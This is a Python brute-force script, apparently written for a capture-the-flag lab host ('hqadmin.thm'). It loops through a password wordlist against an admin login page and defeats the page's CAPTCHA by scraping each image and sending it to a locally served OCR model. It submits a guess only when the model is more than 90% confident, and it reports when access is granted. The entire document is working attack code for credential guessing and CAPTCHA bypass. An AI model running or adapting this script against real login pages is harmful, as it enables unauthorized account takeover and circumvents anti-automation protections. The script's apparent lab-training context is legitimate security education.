#Import libraries
import requests
import base64
import json
from bs4 import BeautifulSoup

username = "admin"
passwords = []

#URLs for our requests
website_url = "http://hqadmin.thm:8000"
model_url = "http://localhost:8501/v1/models/ocr:predict"

#Load in the passwords for brute forcing
with open("passwords.txt", "r") as wordlist:
    lines = wordlist.readlines()
    for line in lines:
        passwords.append(line.replace("\n",""))


access_granted = False
count = 0

#Run the brute force attack until we are out of passwords or have gained access
while(access_granted == False and count < len(passwords)):
    #This will run a brute force for each password
    password = passwords[count]

    #First, we connect to the webapp so we can get the CAPTCHA. We will use a session so cookies are taken care of for us
    sess = requests.session()
    r = sess.get(website_url)
    
    #Use soup to parse the HTML and extract the CAPTCHA image
    soup = BeautifulSoup(r.content, 'html.parser')
    img = soup.find("img")    
    encoded_image = img['src'].split(" ")[1]
    
    #Build the JSON request to send to the CAPTCHA predictor
    model_data = {
        'signature_name' : 'serving_default',
        'inputs' : {'input' : {'b64' : encoded_image} }
        }
        
    #Send the CAPTCHA prediction request and load the response
    r = requests.post(model_url, json=model_data)
    prediction = r.json()
    probability = prediction["outputs"]["probability"]
    answer = prediction["outputs"]["output"]

    #We can increase our guessing accuracy by only submitting the answer if we are more than 90% sure
    if (probability < 0.90):
        #If lower than 90%, no submission of CAPTCHA
        print ("[-] Prediction probability too low, not submitting CAPTCHA")
        continue

    #Otherwise, we are good to go with our brute forcer
    #Build the POST data for our brute force attempt
    website_data = {
            'username' : username,
            'password' : password,
            'captcha' : answer,
            'submit' : "Submit+Query"
            }

    #Submit our brute force attack
    r = sess.post(website_url, data=website_data)

    #Read the response and interpret the results of the brute force attempt
    response = r.text

    #If the response tells us that we submitted the wrong CAPTCHA, we have to try again with this password
    if ("Incorrect CAPTCHA value supplied" in response):
        print ("[-] Incorrect CAPTCHA value was supplied. We will resubmit this password")
        continue
    #If the response tells us that we submitted the wrong password, we can try with the next password
    elif ("Incorrect Username or Password" in response):
        print ("[-] Invalid credential pair -- Username: " + username + " Password: " + password)
        count += 1
    #Otherwise, we have found the correct password!
    else:
        print ("[+] Access Granted!! -- Username: " + username + " Password: " + password)
        access_granted = True

